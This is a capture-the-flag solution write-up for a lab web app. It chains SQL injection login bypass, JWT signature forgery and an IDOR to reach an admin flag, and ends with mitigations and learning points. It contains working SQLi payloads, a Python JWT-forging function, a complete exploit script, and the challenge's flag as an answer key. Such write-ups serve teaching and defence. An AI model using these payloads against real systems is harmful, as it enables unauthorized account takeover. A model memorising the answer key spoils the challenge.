# Challenge 20: ChainPwn - Solution

## Vulnerability Type
**Multi-Step Exploit Chain: SQL Injection → IDOR → JWT Forgery**

## Description
This challenge requires chaining three vulnerabilities together: SQL injection to bypass login, IDOR to access admin's flag, and JWT forgery to bypass role checks.

## Vulnerable Code

### 1. SQL Injection in Login
```javascript
user = db.prepare(`SELECT * FROM users WHERE username='${username}' AND password='${password}'`).get();
```

### 2. IDOR in Flag API
```javascript
// VULNERABLE: uses uid from query param, not from token
const uid = parseInt(req.query.uid) || payload.uid;
```

### 3. Weak JWT Signature
```javascript
// VULNERABLE: sig = base64(header + '.' + payload) — forgeable
const s = Buffer.from(h+'.'+p).toString('base64url');
```

## Exploitation Steps

### Step 1: SQL Injection to Get Admin Token

**Payload for username field:**
```
admin' --
```

**Or:**
```
' OR username='admin' --
```

**Full request:**
```
POST /login
username=admin' --&password=anything
```

This bypasses authentication and logs you in as admin, giving you admin's JWT token.

### Step 2: Extract Admin's JWT

After successful SQLi login, you'll be redirected to `/dashboard` where the JWT is displayed:
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1aWQiOjEsInVzZXJuYW1lIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.ZXlKaGJHY2lPaUpJVXpJMU5pSXNJblI1Y0NJNklrcFhWQ0o5LmV5SjFhV1FpT2pFc0luVnpaWEp1WVcxbElqb2lZV1J0YVc0aUxDSnliMnhsSWpvaVlXUnRhVzRpZlE
```

### Step 3: Understand JWT Structure

Decode the JWT (use jwt.io or base64 decode):

**Header:**
```json
{"alg":"HS256","typ":"JWT"}
```

**Payload:**
```json
{"uid":1,"username":"admin","role":"admin"}
```

**Signature:**
The signature is just `base64url(header + '.' + payload)` — no real cryptographic signature!

### Step 4: Forge JWT (If Needed)

If you need to modify the JWT:

```python
import base64
import json

def base64url_encode(data):
    return base64.urlsafe_b64encode(data.encode()).decode().rstrip('=')

# Create forged JWT
header = {"alg":"HS256","typ":"JWT"}
payload = {"uid":1,"username":"admin","role":"admin"}

h = base64url_encode(json.dumps(header))
p = base64url_encode(json.dumps(payload))
s = base64url_encode(h + '.' + p)  # Weak signature

forged_token = f"{h}.{p}.{s}"
print(forged_token)
```

### Step 5: Access Admin's Flag

**Method 1: Direct URL (with admin token)**
```
GET /api/flag?uid=1&token=[ADMIN_JWT_TOKEN]
```

**Method 2: Using curl**
```bash
curl "http://[host]/api/flag?uid=1&token=[ADMIN_JWT_TOKEN]"
```

**Response:**
```json
{
  "flag": "FCTF{ch41n_3xpl01t_m4st3r}",
  "requested_uid": 1,
  "token_user": "admin"
}
```

## Complete Exploit Script

```python
import requests
import base64
import json

url = "http://[host]"

# Step 1: SQL Injection to login as admin
print("[*] Step 1: SQL Injection to bypass login...")
s = requests.Session()
r = s.post(f"{url}/login", data={
    "username": "admin' --",
    "password": "anything"
})

if "dashboard" in r.url:
    print("[+] Successfully logged in as admin!")
    
    # Extract token from dashboard
    r = s.get(f"{url}/dashboard")
    token_start = r.text.find("<pre>") + 5
    token_end = r.text.find("</pre>", token_start)
    admin_token = r.text[token_start:token_end].strip()
    print(f"[+] Admin JWT: {admin_token}")
    
    # Step 2: Access admin's flag
    print("\n[*] Step 2: Accessing admin's flag...")
    r = requests.get(f"{url}/api/flag", params={
        "uid": 1,
        "token": admin_token
    })
    
    data = r.json()
    if "flag" in data:
        print(f"[+] Flag: {data['flag']}")
    else:
        print(f"[-] Error: {data}")
else:
    print("[-] Login failed")
```

## Alternative: Login as Bob, Then Exploit

If you want to see all three vulnerabilities:

```python
# 1. Login as bob (normal login)
s.post(f"{url}/login", data={"username": "bob", "password": "bob123"})

# 2. Get bob's token
r = s.get(f"{url}/dashboard")
# Extract token...

# 3. Forge admin token
def forge_jwt(uid, username, role):
    header = {"alg":"HS256","typ":"JWT"}
    payload = {"uid":uid,"username":username,"role":role}
    
    h = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=')
    p = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')
    s = base64.urlsafe_b64encode((h + '.' + p).encode()).decode().rstrip('=')
    
    return f"{h}.{p}.{s}"

admin_token = forge_jwt(1, "admin", "admin")

# 4. Access admin flag with forged token
r = requests.get(f"{url}/api/flag?uid=1&token={admin_token}")
print(r.json())
```

## Flag
```
FCTF{ch41n_3xpl01t_m4st3r}
```

## Vulnerability Chain Summary

```
┌─────────────────┐
│  SQL Injection  │ → Bypass login, get admin session
└────────┬────────┘
         │
         ▼
┌─────────────────┐
│   Get Admin JWT │ → Extract admin's JWT token
└────────┬────────┘
         │
         ▼
┌─────────────────┐
│  Weak JWT Sig   │ → Signature is just base64(header.payload)
└────────┬────────┘
         │
         ▼
┌─────────────────┐
│      IDOR       │ → Access uid=1 with admin role in JWT
└────────┬────────┘
         │
         ▼
┌─────────────────┐
│   Get Flag! 🚩  │
└─────────────────┘
```

## How Each Vulnerability Works

### 1. SQL Injection
```sql
-- Original query:
SELECT * FROM users WHERE username='admin' --' AND password='...'

-- After injection, becomes:
SELECT * FROM users WHERE username='admin'
-- The rest is commented out
```

### 2. IDOR (Insecure Direct Object Reference)
```javascript
// Takes uid from query parameter instead of validating against token
const uid = parseInt(req.query.uid) || payload.uid;
```

### 3. JWT Forgery
```javascript
// Weak signature algorithm
const s = Buffer.from(h+'.'+p).toString('base64url');
// Attacker can compute this without knowing any secret!
```

## Mitigation

### 1. Fix SQL Injection
```javascript
// Use parameterized queries
const stmt = db.prepare('SELECT * FROM users WHERE username=? AND password=?');
const user = stmt.get(username, password);
```

### 2. Fix IDOR
```javascript
// Always use uid from authenticated token, never from user input
const uid = payload.uid;  // Don't trust req.query.uid

// Add authorization check
if (uid === 1 && payload.role !== 'admin') {
    return res.json({error: 'Unauthorized'});
}
```

### 3. Fix JWT Signature
```javascript
const jwt = require('jsonwebtoken');
const SECRET = crypto.randomBytes(32).toString('hex');

// Create token with real signature
function makeToken(payload) {
    return jwt.sign(payload, SECRET, { algorithm: 'HS256' });
}

// Verify token properly
function verifyToken(token) {
    try {
        return jwt.verify(token, SECRET);
    } catch {
        return null;
    }
}
```

## Learning Points
- **Defense in Depth**: Multiple vulnerabilities can be chained
- **Input Validation**: Never trust user input (SQL, JWT, query params)
- **Proper Authentication**: Use established libraries for JWT
- **Authorization Checks**: Verify permissions at every step
- **Parameterized Queries**: Always use prepared statements

## References
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [JWT Best Practices](https://tools.ietf.org/html/rfc8725)
- [SQL Injection Prevention](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
